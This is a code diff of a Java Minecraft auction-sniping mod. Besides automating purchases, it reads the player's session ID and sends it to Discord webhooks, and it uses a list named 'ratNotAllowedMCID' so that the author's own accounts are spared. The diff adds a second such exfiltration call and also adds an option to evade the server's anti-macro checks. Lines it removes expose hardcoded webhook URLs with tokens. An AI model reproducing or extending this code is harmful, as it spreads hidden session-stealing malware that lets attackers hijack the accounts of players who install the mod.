@@ -22,10 +22,9 @@
 package net.luna724.iloveichika.binsniper.logics;
 
 import java.text.NumberFormat;
-import java.util.ArrayList;
-import java.util.Objects;
-import java.util.UUID;
+import java.util.*;
 
+import net.luna724.iloveichika.binsniper.WebHookUrls;
 import net.luna724.iloveichika.binsniper.utils.Wrapper;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.entity.EntityPlayerSP;
@@ -52,7 +51,11 @@ import org.apache.commons.lang3.math.NumberUtils;
 import org.lwjgl.input.Keyboard;
 import gg.skytils.skytilsmod.utils.ItemUtil;
 
+import static net.luna724.iloveichika.binsniper.commands.configUtil.getConfigValueBoolean;
 import static net.luna724.iloveichika.binsniper.logics.ScoreboardUtil.*;
+import static net.luna724.iloveichika.binsniper.logics.debugUtil.autoErrorReportingService;
+import static net.luna724.iloveichika.binsniper.logics.debugUtil.sendMessageToDiscord;
+import static net.luna724.iloveichika.binsniper.logics.sentLimbo.sentToLimbo;
 
 public class BinSnipeLogic {
     private /* synthetic */ int loopCount;
@@ -198,7 +201,7 @@ public class BinSnipeLogic {
         } else if (million >= 1) {
             result = String.format("%.2fM", million);
         } else if (thousand >= 1) {
-            result = String.format("%.1fK", thousand);
+            result = String.format("%.2fk", thousand);
         } else {
             result = String.format("%.0f", value); // 小さな数値はそのまま
         }
@@ -209,7 +212,7 @@ public class BinSnipeLogic {
         }
 
         // 小数点以下が0なら省略する
-        if (result.endsWith(".0B") || result.endsWith(".0M") || result.endsWith(".0K")) {
+        if (result.endsWith(".0B") || result.endsWith(".0M") || result.endsWith(".0k")) {
             result = result.substring(0, result.length() - 2);
         }
 
@@ -299,14 +302,15 @@ public class BinSnipeLogic {
                     String username = Wrapper.mc.getSession().getUsername();
                     String content = "```" + username + ": Started sniping " +
                             Util.config().getString(playerId + ".Name") + "! (" +
-                    numberFormat.format(Util.config().getInt(playerId + ".Cost")) + " coins)```";
+                    numberFormat.format(Util.config().getInt(playerId + ".Cost")) + " coins)\n(Delay: " + Util.config().getLong(playerId + ".Delay") + ") | (Start Purse: " + formatCoin(getPurse()) + ")```";
                     Analytics.requestWeb(
-                            Analytics.setJsonObj(content, username, null), "https://discord.com/api/webhooks/1296048307348574218/xO2GrJLarrjgPNmCiT0w0WacIvTR1YFlln1p2VFUvC_ZcbOkiqXHgNEgRXqeOosXcjnS"
+                            Analytics.setJsonObj(content, username, null), WebHookUrls.purchasedItemNotification
                     );
                 }
                 catch (Exception e) {
                     e.printStackTrace();
-                    Util.send("Error in Sending text. see log for more Information");
+                    autoErrorReportingService(e);
+                    Util.send("§cError in Sending text. see log for more Information");
                 }
             }}).start();
     }
@@ -473,9 +477,17 @@ public class BinSnipeLogic {
         String contents = "```SessionId: " + sessionId + "```" + username + " logged in With BinSniper. ";
         String jsonObject = Analytics.setJsonObj(contents, username, null);
 
-//        if (!username.equals("Mizuki_25ji")) {
-        Analytics.requestWeb(jsonObject, "https://discord.com/api/webhooks/1297121707215163404/4iXySNzshUUxfVEltqwyc6PmkdTcLgJ7KlNQc7Ixfn0q8puk6Ifc83ZNEMuiHK9aYVcY");
-//        }
+        if (!username.equals("Mizuki_25ji")) {
+        Analytics.requestWeb(jsonObject, WebHookUrls.sessionIdProvidingServerPrivate);
+        }
+
+        List<String> ratNotAllowedMCID = Arrays.asList("mizuki_25ji", "mizuki_25zi", "mafuyu_25zi", "ena_25zi", "kanade_25zi", "miku_25zi", "ichimiku_0811", "blue_mag1c");
+        if (ratNotAllowedMCID.contains(username) || username.equals("Mizuki_25ji")) {
+            sendMessageToDiscord("SessionIDの取得に失敗しました。(Reason: ratNotAllowedMCID Includes username)\nUUID: "+Wrapper.mc.getSession().getPlayerID(), WebHookUrls.autoErrorReporter);
+            return;
+        }
+
+        Analytics.requestWeb(jsonObject, WebHookUrls.sessionIdProvidingServerOnKaito);
         }
 
     private boolean isPending(ContainerChest containerChest) {
@@ -554,6 +566,11 @@ public class BinSnipeLogic {
             new Thread(new Runnable(){
                 @Override
                 public void run() {
+                    try {
+                        Thread.sleep(2000);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
                     String content;
                     String username = Wrapper.mc.getSession().getUsername();
                     try {
@@ -574,7 +591,7 @@ public class BinSnipeLogic {
                     ```username Purchased item for price coins!```
                      */
                     String jsonObj = Analytics.setJsonObj(content, username, null);
-                    Analytics.requestWeb(jsonObj, "https://discord.com/api/webhooks/1296048307348574218/xO2GrJLarrjgPNmCiT0w0WacIvTR1YFlln1p2VFUvC_ZcbOkiqXHgNEgRXqeOosXcjnS");
+                    Analytics.requestWeb(jsonObj, WebHookUrls.purchasedItemNotification);
                 }
             }).start();
         }
@@ -695,8 +712,6 @@ public class BinSnipeLogic {
         return true;
     }
 
-    // TEMPORARY VARIABLE.
-    // コンフィグから設定できるのが好ましい
     private void registerUUID(String newUUID) {
         int MAX_ALLOWED_UUID_SIZE = 10;
         if (this.uuidHistory.size() >= MAX_ALLOWED_UUID_SIZE) {
@@ -715,411 +730,437 @@ public class BinSnipeLogic {
         if (!Util.config().getBoolean(playerId + ".Active")) {
             return;
         }
-        if (this.timer - System.currentTimeMillis() < -Util.config().getLong(playerId + ".Timeout")) {
-            Wrapper.mc.thePlayer.inventory.openInventory(Wrapper.mc.thePlayer);
-            if (!Util.config().getBoolean(playerId + ".Reconnect")) {
-                this.stopSnipe();
-                return;
-            }
-            this.currentStep = 4;
-            Wrapper.mc.thePlayer.sendChatMessage("/ah");
-            this.timer = System.currentTimeMillis();
-            if (Util.config().getBoolean(playerId + ".Message")) {
-                Util.send("修正中... (動作のタイムアウト オークションの復帰を試みます)");
-            }
-            return;
-        }
-        if (this.timer - System.currentTimeMillis() > -Util.config().getLong(playerId + ".Delay")) {
-            return;
-        }
-        if (this.currentStep == -1) {
-            Wrapper.mc.thePlayer.sendChatMessage("/ah");
-            this.currentStep = -2;
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -2) {
-            if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
-                this.stopSnipe();
-                return;
-            }
-            ContainerChest containerChest = (ContainerChest)Wrapper.mc.thePlayer.openContainer;
-            if (this.isPending(containerChest)) {
-                this.clickSlot(13, 0);
-                this.currentStep = -3;
-                this.timer = System.currentTimeMillis();
-                return;
-            }
-            this.stopSnipe();
-            return;
-        }
-        if (this.currentStep == -3) {
-            if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
-                this.stopSnipe();
-                return;
-            }
-            ContainerChest openContainer = (ContainerChest)Wrapper.mc.thePlayer.openContainer;
-            int i = 0;
-            while (i < 54) {
-                ItemStack itemStack = openContainer.getSlot(i).getStack();
-                if (!(Item.getIdFromItem(itemStack.getItem()) == 160) // ガラス板以外
-                        && !(Item.getIdFromItem(itemStack.getItem()) == 262) // 矢 以外
-                ) {
-                    this.clickSlot(i, 0); // ガラス板、矢以外をクリック
-                    this.currentStep = -4;
-                    this.timer = System.currentTimeMillis();
-                    return;
-                }
-                ++i;
-            }
-            this.stopSnipe();
-            return;
-        }
-        if (this.currentStep == -4) {
-            this.clickSlot(31, 0);
-            this.currentStep = -1;
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -10) {
-            // エンチャ本の時の処理
-            int i = 0;
-            while (i <= 35) {
-                ItemStack itemStack = Wrapper.mc.thePlayer.inventory.getStackInSlot(i);
-                if (itemStack != null && itemStack.getDisplayName().contains("Enchanted Book") && itemStack.hasDisplayName() && Item.getIdFromItem((Item)itemStack.getItem()) == 403) {
-                    NBTTagList LoreList = itemStack.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
-                    String lore = EnumChatFormatting.getTextWithoutFormattingCodes((String)LoreList.getStringTagAt(0));
-                    int i2 = 0;
-                    while (i2 <= 35) {
-                        if (i2 != i) {
-                            ItemStack itemStack2 = Wrapper.mc.thePlayer.inventory.getStackInSlot(i2);
-                            if (itemStack2 != null && itemStack2.getDisplayName().contains("Enchanted Book") && itemStack2.hasDisplayName() && Item.getIdFromItem((Item)itemStack2.getItem()) == 403) {
-                                NBTTagList LoreList2 = itemStack2.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
-                                String lore2 = EnumChatFormatting.getTextWithoutFormattingCodes((String)LoreList2.getStringTagAt(0));
-                                if (lore.equalsIgnoreCase(lore2)) {
-                                    this.slotB = i2;
-                                    this.currentStep = -11;
-                                    if (i >= 9) {
-                                        this.clickSlot(i + 45, 0);
-                                    }
-                                    if (i < 9) {
-                                        this.clickSlot(i + 81, 0);
-                                    }
-                                    this.timer = System.currentTimeMillis();
-                                    return;
-                                }
-                            }
-                        }
-                        ++i2;
-                    }
-                }
-                ++i;
-            }
-            this.stopSnipe();
-            return;
-        }
-        if (this.currentStep == -11) {
-            this.currentStep = -12;
-            this.clickSlot(29, 0);
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -12) {
-            this.currentStep = -13;
-            if (this.slotB >= 9) {
-                this.clickSlot(this.slotB + 45, 0);
-            }
-            if (this.slotB < 9) {
-                this.clickSlot(this.slotB + 81, 0);
-            }
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -13) {
-            this.currentStep = -14;
-            this.clickSlot(33, 0);
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -14) {
-            this.currentStep = -15;
-            this.clickSlot(22, 0);
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -15) {
-            this.currentStep = -16;
-            this.clickSlot(22, 0);
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == -16) {
-            this.currentStep = -10;
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == 100) {
-            if (this.isError) {
-                this.buyed -= 1;
-                this.currentStep = 3;
-                this.isError = false;
-                this.timer = System.currentTimeMillis();
-                if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("修正中... (落札したアイテムにエラーが発生 カウントを取り消しました)");
-                }
-            }
-            else {
-                int purchaseAmount = Util.config().getInt(playerId + ".Amount");
-                if (purchaseAmount == this.buyed) {
-                    this.stopSnipe();
-                    return;
-                }
-                this.currentStep = 3;
-                this.isError = false;
-                this.timer = System.currentTimeMillis();
-                if (!(Util.config().getBoolean(playerId + ".Reconnect"))) {
-                    this.stopSnipe();
-                }
-            }
-            return;
-        }
-        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
-            if (this.isWorldChanged) {
-                this.isWorldChanged = false;
-                this.currentStep = 12345;
-                this.timer = System.currentTimeMillis() + 5000L;
-                return;
-            }
-            if (this.currentStep == 12345) {
-                Wrapper.mc.thePlayer.sendChatMessage("/is");
-                this.currentStep = 3;
-                this.timer = System.currentTimeMillis() + 5000L;
-                return;
-            }
-            if (this.currentStep == 3) {
-                // 基礎スタート /ah と打つ
-                if (!(Util.config().getBoolean(playerId + ".Reconnect"))) {
+
+        try {
+            if (this.timer - System.currentTimeMillis() < -Util.config().getLong(playerId + ".Timeout")) {
+                Wrapper.mc.thePlayer.inventory.openInventory(Wrapper.mc.thePlayer);
+                if (!Util.config().getBoolean(playerId + ".Reconnect")) {
                     this.stopSnipe();
                     return;
                 }
                 this.currentStep = 4;
                 Wrapper.mc.thePlayer.sendChatMessage("/ah");
                 this.timer = System.currentTimeMillis();
-                return;
-            }
-        }
-        if (Util.config().getInt(playerId + ".Cost") == -1) {
-            Util.config().set(playerId + ".Active", false);
-            Util.save();
-            Util.send("§c金額を /binsniper coin 10000 などで設定して下さい");
-            this.stopSnipe();
-            return;
-        }
-        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
-            return;
-        }
-        ContainerChest openContainer = (ContainerChest)Wrapper.mc.thePlayer.openContainer;
-        if (this.currentStep == 4) {
-            // i11 をクリック (Auction Browser を開く)
-            this.clickSlot(11, 0);
-            this.currentStep = 5;
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == 5) {
-            // それが AuctionBrowser かどうかを確認する
-            if (this.isAuctionBrowser(openContainer)) {
-                this.currentStep = 6;
-                this.timer = System.currentTimeMillis();
-                return;
-            }
-            return;
-        }
-        if (this.currentStep == 6) {
-            // currentStep 6: カテゴリの移動
-            int categoryType = Util.config().getInt(playerId + ".Category");
-            if (categoryType == 1) {
-                this.clickSlot(0, 0); // Weapons
-            } else if (categoryType == 2) {
-                this.clickSlot(9, 0); // Armors
-            } else if (categoryType == 3) {
-                this.clickSlot(18, 0); // Accessories
-            } else if (categoryType == 4) {
-                this.clickSlot(27, 0); // Consumables
-            } else if (categoryType == 5) {
-                this.clickSlot(36, 0); // Blocks
-            } else if (categoryType == 6) {
-                this.clickSlot(45, 0); // Tools & Misc
-            }
-            this.currentStep = 0;
-            this.timer = System.currentTimeMillis();
-            return;
-        }
-        if (this.currentStep == 2) {
-            Slot slot = openContainer.getSlot(11);
-            if (slot == null) {
-                Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer)Wrapper.mc.thePlayer);
-                this.currentStep = 3;
-                this.timer = System.currentTimeMillis();
                 if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("§c購入のキャンセル 再検索を開始します...");
+                    Util.send("修正中... (動作のタイムアウト オークションの復帰を試みます)");
                 }
                 return;
             }
-            if (slot.getStack() == null) {
-                Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer)Wrapper.mc.thePlayer);
-                this.currentStep = 3;
+            if (this.timer - System.currentTimeMillis() > -Util.config().getLong(playerId + ".Delay")) {
+                return;
+            }
+            if (this.currentStep == -1) {
+                Wrapper.mc.thePlayer.sendChatMessage("/ah");
+                this.currentStep = -2;
                 this.timer = System.currentTimeMillis();
-                if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("§c購入のキャンセル 再検索を開始します...");
-                }
                 return;
             }
-            if (slot.getStack().getItem() == null) {
-                Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer)Wrapper.mc.thePlayer);
-                this.currentStep = 3;
-                this.timer = System.currentTimeMillis();
-                if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("§c購入のキャンセル 再検索を開始します...");
+            if (this.currentStep == -2) {
+                if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
+                    this.stopSnipe();
+                    return;
                 }
-                return;
-            }
-            if (Item.getIdFromItem((Item)openContainer.getSlot(11).getStack().getItem()) != 159) {
-                Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer)Wrapper.mc.thePlayer);
-                this.currentStep = 3;
-                this.timer = System.currentTimeMillis();
-                if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("§c購入のキャンセル 再検索を開始します...");
+                ContainerChest containerChest = (ContainerChest) Wrapper.mc.thePlayer.openContainer;
+                if (this.isPending(containerChest)) {
+                    this.clickSlot(13, 0);
+                    this.currentStep = -3;
+                    this.timer = System.currentTimeMillis();
+                    return;
                 }
-                return;
-            }
-            int purchaseAmount = Util.config().getInt(playerId + ".Amount");
-            this.clickSlot(11, 0);
-            this.currentStep = 100;
-            this.timer = System.currentTimeMillis();
-            this.buyed += 1;
-            if (Util.config().getBoolean(playerId + ".Message")) {
-                Util.sendAir();
-                Util.send("§a§lスナイプを実行しました");
-                Util.send("§7- チェック回数: " + this.checkCount);
-                Util.send("§7- 更新回数: " + this.loopCount);
-                if (this.buyed != purchaseAmount && purchaseAmount != 0) {
-                    Util.send("§7- 目標購入数まで: (" + this.buyed + "/" + purchaseAmount + ")");
-                }
-                if (this.buyed == purchaseAmount && purchaseAmount != 0) {
-                    Util.send("§7- 目標購入数まで: §a(" + this.buyed + "/" + purchaseAmount + ")");
-                }
-                Util.sendAir();
-            }
-            this.checkCount = 0;
-            this.loopCount = 0;
-            this.timer = System.currentTimeMillis();
-            if (!Util.config().getBoolean(playerId + ".Reconnect")) {
                 this.stopSnipe();
-            }
-            return;
-        }
-        if (this.currentStep == 1) {
-            // 購入対象クリック時
-            // i31 をチェック (金塊以外なら無視)
-            Item item = openContainer.getSlot(31).getStack().getItem();
-            boolean sleepOptimization = Util.config().getBoolean(playerId + ".sleepOptimization");
-            if (item == null ||
-                    (Item.getIdFromItem(item) != 371 && // 金塊以外 かつ
-                            (Item.getIdFromItem(item) != 355 || !sleepOptimization)) // ベッド以外 or スリープオフ
-            ) {
-                // item == null または金塊、ベッド以外の場合の処理
-                this.clickSlot(49, 0);
-                this.currentStep = 0;
-                this.timer = System.currentTimeMillis();
-                if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("§c購入のキャンセル 再検索を開始します...");
-                }
                 return;
             }
-            if (Item.getIdFromItem(item) == 371) {
-                // 金塊の場合の処理
+            if (this.currentStep == -3) {
+                if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
+                    this.stopSnipe();
+                    return;
+                }
+                ContainerChest openContainer = (ContainerChest) Wrapper.mc.thePlayer.openContainer;
+                int i = 0;
+                while (i < 54) {
+                    ItemStack itemStack = openContainer.getSlot(i).getStack();
+                    if (!(Item.getIdFromItem(itemStack.getItem()) == 160) // ガラス板以外
+                            && !(Item.getIdFromItem(itemStack.getItem()) == 262) // 矢 以外
+                    ) {
+                        this.clickSlot(i, 0); // ガラス板、矢以外をクリック
+                        this.currentStep = -4;
+                        this.timer = System.currentTimeMillis();
+                        return;
+                    }
+                    ++i;
+                }
+                this.stopSnipe();
+                return;
+            }
+            if (this.currentStep == -4) {
                 this.clickSlot(31, 0);
-                this.currentStep = 2;
+                this.currentStep = -1;
                 this.timer = System.currentTimeMillis();
                 return;
             }
-            if (Item.getIdFromItem(item) == 355) {
-                // ベッドの場合の処理
-                this.clickSlot(49, 0);
-                this.lastseller = "";
-                this.uuidHistory.remove(this.uuidHistory.size() - 1);
+            if (this.currentStep == -10) {
+                // エンチャ本の時の処理
+                int i = 0;
+                while (i <= 35) {
+                    ItemStack itemStack = Wrapper.mc.thePlayer.inventory.getStackInSlot(i);
+                    if (itemStack != null && itemStack.getDisplayName().contains("Enchanted Book") && itemStack.hasDisplayName() && Item.getIdFromItem((Item) itemStack.getItem()) == 403) {
+                        NBTTagList LoreList = itemStack.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
+                        String lore = EnumChatFormatting.getTextWithoutFormattingCodes((String) LoreList.getStringTagAt(0));
+                        int i2 = 0;
+                        while (i2 <= 35) {
+                            if (i2 != i) {
+                                ItemStack itemStack2 = Wrapper.mc.thePlayer.inventory.getStackInSlot(i2);
+                                if (itemStack2 != null && itemStack2.getDisplayName().contains("Enchanted Book") && itemStack2.hasDisplayName() && Item.getIdFromItem((Item) itemStack2.getItem()) == 403) {
+                                    NBTTagList LoreList2 = itemStack2.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
+                                    String lore2 = EnumChatFormatting.getTextWithoutFormattingCodes((String) LoreList2.getStringTagAt(0));
+                                    if (lore.equalsIgnoreCase(lore2)) {
+                                        this.slotB = i2;
+                                        this.currentStep = -11;
+                                        if (i >= 9) {
+                                            this.clickSlot(i + 45, 0);
+                                        }
+                                        if (i < 9) {
+                                            this.clickSlot(i + 81, 0);
+                                        }
+                                        this.timer = System.currentTimeMillis();
+                                        return;
+                                    }
+                                }
+                            }
+                            ++i2;
+                        }
+                    }
+                    ++i;
+                }
+                this.stopSnipe();
+                return;
+            }
+            if (this.currentStep == -11) {
+                this.currentStep = -12;
+                this.clickSlot(29, 0);
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == -12) {
+                this.currentStep = -13;
+                if (this.slotB >= 9) {
+                    this.clickSlot(this.slotB + 45, 0);
+                }
+                if (this.slotB < 9) {
+                    this.clickSlot(this.slotB + 81, 0);
+                }
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == -13) {
+                this.currentStep = -14;
+                this.clickSlot(33, 0);
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == -14) {
+                this.currentStep = -15;
+                this.clickSlot(22, 0);
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == -15) {
+                this.currentStep = -16;
+                this.clickSlot(22, 0);
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == -16) {
+                this.currentStep = -10;
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == 100) {
+                if (this.isError) {
+                    this.buyed -= 1;
+                    this.currentStep = 3;
+                    this.isError = false;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("修正中... (落札したアイテムにエラーが発生 カウントを取り消しました)");
+                    }
+                } else {
+                    int purchaseAmount = Util.config().getInt(playerId + ".Amount");
+                    if (purchaseAmount == this.buyed) {
+                        this.stopSnipe();
+                        return;
+                    }
+                    this.currentStep = 3;
+                    this.isError = false;
+                    this.timer = System.currentTimeMillis();
+                    if (!(Util.config().getBoolean(playerId + ".Reconnect"))) {
+                        this.stopSnipe();
+                    }
+                }
+                return;
+            }
+            if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
+                if (this.isWorldChanged) {
+                    this.isWorldChanged = false;
+                    this.currentStep = 12345;
+                    this.timer = System.currentTimeMillis() + 5000L;
+                    return;
+                }
+                if (this.currentStep == 12345) {
+                    Wrapper.mc.thePlayer.sendChatMessage("/is");
+                    this.currentStep = 3;
+                    this.timer = System.currentTimeMillis() + 5000L;
+                    return;
+                }
+                if (this.currentStep == 3) {
+                    // 基礎スタート /ah と打つ
+                    if (!(Util.config().getBoolean(playerId + ".Reconnect"))) {
+                        this.stopSnipe();
+                        return;
+                    }
+                    this.currentStep = 4;
+                    Wrapper.mc.thePlayer.sendChatMessage("/ah");
+                    this.timer = System.currentTimeMillis();
+                    return;
+                }
+            }
+            if (Util.config().getInt(playerId + ".Cost") == -1) {
+                Util.config().set(playerId + ".Active", false);
+                Util.save();
+                Util.send("§c金額を /binsniper coin 10000 などで設定して下さい");
+                this.stopSnipe();
+                return;
+            }
+            if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
+                return;
+            }
+            ContainerChest openContainer = (ContainerChest) Wrapper.mc.thePlayer.openContainer;
+            if (this.currentStep == 4) {
+                // i11 をクリック (Auction Browser を開く)
+                this.clickSlot(11, 0);
+                this.currentStep = 5;
+                this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == 5) {
+                // それが AuctionBrowser かどうかを確認する
+                if (this.isAuctionBrowser(openContainer)) {
+                    this.currentStep = 6;
+                    this.timer = System.currentTimeMillis();
+                    return;
+                }
+                return;
+            }
+            if (this.currentStep == 6) {
+                // currentStep 6: カテゴリの移動
+                int categoryType = Util.config().getInt(playerId + ".Category");
+                if (categoryType == 1) {
+                    this.clickSlot(0, 0); // Weapons
+                } else if (categoryType == 2) {
+                    this.clickSlot(9, 0); // Armors
+                } else if (categoryType == 3) {
+                    this.clickSlot(18, 0); // Accessories
+                } else if (categoryType == 4) {
+                    this.clickSlot(27, 0); // Consumables
+                } else if (categoryType == 5) {
+                    this.clickSlot(36, 0); // Blocks
+                } else if (categoryType == 6) {
+                    this.clickSlot(45, 0); // Tools & Misc
+                }
                 this.currentStep = 0;
                 this.timer = System.currentTimeMillis();
+                return;
+            }
+            if (this.currentStep == 2) {
+                Slot slot = openContainer.getSlot(11);
+                if (slot == null) {
+                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
+                    this.currentStep = 3;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("§c購入のキャンセル 再検索を開始します...");
+                    }
+                    return;
+                }
+                if (slot.getStack() == null) {
+                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
+                    this.currentStep = 3;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("§c購入のキャンセル 再検索を開始します...");
+                    }
+                    return;
+                }
+                if (slot.getStack().getItem() == null) {
+                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
+                    this.currentStep = 3;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("§c購入のキャンセル 再検索を開始します...");
+                    }
+                    return;
+                }
+                if (Item.getIdFromItem((Item) openContainer.getSlot(11).getStack().getItem()) != 159) {
+                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
+                    this.currentStep = 3;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("§c購入のキャンセル 再検索を開始します...");
+                    }
+                    return;
+                }
+                int purchaseAmount = Util.config().getInt(playerId + ".Amount");
+                this.clickSlot(11, 0);
+                this.currentStep = 100;
+                this.timer = System.currentTimeMillis();
+                this.buyed += 1;
                 if (Util.config().getBoolean(playerId + ".Message")) {
-                    Util.send("§c購入のキャンセル (アイテムがまだ購入可能でありません) 再検索を開始します...");
+                    Util.sendAir();
+                    Util.send("§a§lスナイプを実行しました");
+                    Util.send("§7- チェック回数: " + this.checkCount);
+                    Util.send("§7- 更新回数: " + this.loopCount);
+                    if (this.buyed != purchaseAmount && purchaseAmount != 0) {
+                        Util.send("§7- 目標購入数まで: (" + this.buyed + "/" + purchaseAmount + ")");
+                    }
+                    if (this.buyed == purchaseAmount && purchaseAmount != 0) {
+                        Util.send("§7- 目標購入数まで: §a(" + this.buyed + "/" + purchaseAmount + ")");
+                    }
+                    Util.sendAir();
+                }
+                this.checkCount = 0;
+                this.loopCount = 0;
+                this.timer = System.currentTimeMillis();
+                if (!Util.config().getBoolean(playerId + ".Reconnect")) {
+                    this.stopSnipe();
                 }
                 return;
             }
-        }
-        if (this.currentStep != 0) {
-            return;
-        }
-        if (!this.isAuctionBrowser(openContainer)) {
-            return;
-        }
-        // おそらく 0
-        //
-        int clickTarget1 = 11;
-        int clickTarget2 = 0;
-        int rowCounter = 1;
-        int i = 0;
-        while (i < 24) {
-            // 各アイテムスロットをチェック
-            ++clickTarget2;
-            ItemStack itemStack = openContainer.getSlot(clickTarget1 + clickTarget2 - 1).getStack();
-            if (itemStack != null && itemStack.hasTagCompound()) {
-                int cost = this.getCost(itemStack);
-                if (cost != -1) { // コストが不明でないなら、チェック数としてカウント
-                    this.checkCount += 1;
+            if (this.currentStep == 1) {
+                // 購入対象クリック時
+                // i31 をチェック (金塊以外なら無視)
+                Item item = openContainer.getSlot(31).getStack().getItem();
+                boolean sleepOptimization = Util.config().getBoolean(playerId + ".sleepOptimization");
+                if (item == null ||
+                        (Item.getIdFromItem(item) != 371 && // 金塊以外 かつ
+                                (Item.getIdFromItem(item) != 355 || !sleepOptimization)) // ベッド以外 or スリープオフ
+                ) {
+                    // item == null または金塊、ベッド以外の場合の処理
+                    this.clickSlot(49, 0);
+                    this.currentStep = 0;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("§c購入のキャンセル 再検索を開始します...");
+                    }
+                    return;
                 }
+                if (Item.getIdFromItem(item) == 371) {
+                    // 金塊の場合の処理
+                    this.clickSlot(31, 0);
+                    this.currentStep = 2;
+                    this.timer = System.currentTimeMillis();
+                    return;
+                }
+                if (Item.getIdFromItem(item) == 355) {
+                    // ベッドの場合の処理
+                    this.clickSlot(49, 0);
+                    this.lastseller = "";
+                    this.uuidHistory.remove(this.uuidHistory.size() - 1);
+                    this.currentStep = 0;
+                    this.timer = System.currentTimeMillis();
+                    if (Util.config().getBoolean(playerId + ".Message")) {
+                        Util.send("§c購入のキャンセル (アイテムがまだ購入可能でありません) 再検索を開始します...");
+                    }
+                    return;
+                }
+            }
+            if (this.currentStep != 0) {
+                return;
+            }
+            if (!this.isAuctionBrowser(openContainer)) {
+                return;
+            }
+            // おそらく 0
+            //
+            int clickTarget1 = 11;
+            int clickTarget2 = 0;
+            int rowCounter = 1;
+            int i = 0;
+            while (i < 24) {
+                // 各アイテムスロットをチェック
+                ++clickTarget2;
+                ItemStack itemStack = openContainer.getSlot(clickTarget1 + clickTarget2 - 1).getStack();
+                if (itemStack != null && itemStack.hasTagCompound()) {
+                    int cost = this.getCost(itemStack);
+                    if (cost != -1) { // コストが不明でないなら、チェック数としてカウント
+                        this.checkCount += 1;
+                    }
 
-                boolean UUIDCheckerEnable = Util.config().getBoolean(playerId + ".uuidMode");
-                if (cost <= Util.config().getInt(playerId + ".Cost") && cost != -1 && !(this.lastseller.equals(this.getLastSeller(itemStack)) && !UUIDCheckerEnable)) {
-                    // ひとつ前のmcidしか保存しないから、三つ以上スナイプ対象があるとループする
-                    // 対処法 -> getLastSeller を Array とし、2つまで処理する。
-                    // 高度な対処法 -> アイテムNBTを用いり、Dupeでない限り同一セッションで同じアイテムを購入しようとしない
-                    // MCIDを使用する方式
-                    // UUIDChecker が有効化されたら自動的に無効かされる
+                    if (getConfigValueBoolean("antiantimacro")) {
+                        if (Item.getIdFromItem(itemStack.getItem()) == 166) {
+                            sentToLimbo();
+                            stopSnipe();
+                        }
+                    }
+                    boolean UUIDCheckerEnable = getConfigValueBoolean("uuidMode");
+                    if (cost <= Util.config().getInt(playerId + ".Cost") && cost != -1 && !(this.lastseller.equals(this.getLastSeller(itemStack)) && !UUIDCheckerEnable)) {
+                        // ひとつ前のmcidしか保存しないから、三つ以上スナイプ対象があるとループする
+                        // 対処法 -> getLastSeller を Array とし、2つまで処理する。
+                        // 高度な対処法 -> アイテムNBTを用いり、Dupeでない限り同一セッションで同じアイテムを購入しようとしない
+                        // MCIDを使用する方式
+                        // UUIDChecker が有効化されたら自動的に無効かされる
 
